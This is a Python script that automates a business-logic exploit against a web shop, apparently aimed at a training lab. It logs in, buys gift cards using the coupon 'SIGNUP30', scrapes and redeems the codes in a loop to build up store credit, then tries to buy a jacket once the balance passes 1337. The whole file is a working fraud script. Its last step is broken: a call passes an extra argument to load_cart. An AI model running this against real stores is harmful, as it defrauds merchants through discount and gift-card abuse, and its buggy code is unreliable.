import requests
import argparse
import threading
from queue import Queue
from bs4 import BeautifulSoup
import time
import re


parser = argparse.ArgumentParser()
parser.add_argument("-t", dest="target", help="target")
parser.add_argument("-u", dest="user", help="user")
parser.add_argument("-p", dest="password", help="password")
args = parser.parse_args()

url = args.target
user = args.user
password = args.password


signin_url = url+"/login"
cart_url = url+"/cart"
checkout_url = url+"/cart/checkout"
coupon_url = url+"/cart/coupon"
redeem_url = url+"/gift-card"
jacket_url = url+"/product?productId=1"

def get_csrf(content):
	soup = BeautifulSoup(content, 'lxml')
	csrftoken = soup.find('input', dict(name='csrf'))['value']
	return csrftoken

def get_gift_card_location(content):
	soup = BeautifulSoup(content, 'lxml')
	Gift_card = soup.find_all(text=re.compile('Gift Card')) 
	tag = [tag.parent for tag in Gift_card]
	div = [div.parent for div in tag]
	soup = BeautifulSoup(str(div), 'lxml')
	Gift_card = soup.find('a')['href'] 
	location = Gift_card[-1]
	return location




def load_cart(parameters):
	s.post(cart_url, data=parameters)
	
def check_cart():
	r = s.get(cart_url)
	soup = BeautifulSoup(r.text, 'lxml')
	value = soup.find_all('strong',)
	value = value[0].text
	value = value.split(':')[1]
	value = value.split('$')[1]
	value = value.split('.')[0]
	print(value)
	return value



def checkout():
	r = s.get(cart_url)
	csrftoken = get_csrf(r.text)
	apply_coupon(csrftoken)
	parameters = {"csrf": csrftoken}
	r = s.post(checkout_url, data=parameters)
	return r


def sign_in():
	r = s.get(signin_url)
	csrftoken = get_csrf(r.text)
	parameters = {"csrf": csrftoken,"username": user, "password": password}
	s.post(signin_url, data=parameters)

def get_gift(num):
	if num > 99:
		num = 99
	parameters = {"productId": gift_card,"redir": "PRODUCT","quantity": num}
	load_cart(parameters)

def get_codes(content):
	soup = BeautifulSoup(content, 'lxml')
	table = soup.find("table", class_='is-table-numbers')
	soup = BeautifulSoup(str(table), 'lxml')
	codes = soup.find_all('td')
	plain_codes = []
	for code in codes:
		plain_codes.append(code.text) 
	return plain_codes

def redeem(code):
	r = s.get(signin_url)
	csrftoken = get_csrf(r.text)
	parameters = {"csrf": csrftoken,"gift-card": code}
	s.post(redeem_url, data=parameters)

def apply_coupon(csrftoken):
	parameters = {"csrf": csrftoken,"coupon": "SIGNUP30"}
	s.post(coupon_url, data=parameters)

def hack(num):
	get_gift(num)
	r = checkout()
	codes = get_codes(r.text)
	for code in codes:
		redeem(code)

s = requests.Session()

sign_in()
r = s.get(url)
gift_card = get_gift_card_location(r.text)

for i in range(100):
	number = check_cart()
	amount = int(number)
	if amount > 1337:
		parameters = {"productId": 1,"redir": "PRODUCT","quantity": 1}
		load_cart(jacket_url, data=parameters)
		checkout()
		exit()

	number = amount/10
	number = int(number)
	hack(number)



